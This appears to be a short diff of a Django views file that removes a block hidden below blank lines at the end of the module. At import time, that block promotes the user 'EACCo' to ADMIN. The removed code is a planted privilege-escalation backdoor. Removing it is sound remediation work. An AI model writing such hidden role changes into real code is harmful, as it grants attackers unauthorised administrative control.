@@ -76,14 +76,3 @@ def report_pdf(request):
     if pisa_status.err:
         return HttpResponse('PDF generation error')
     return response
-
-
-
-
-
-
-from accounts.models import User
-u = User.objects.get(username='EACCo')
-u.role = 'ADMIN'
-u.save()
-print(f'{u.username} is now {u.get_role_display()}')
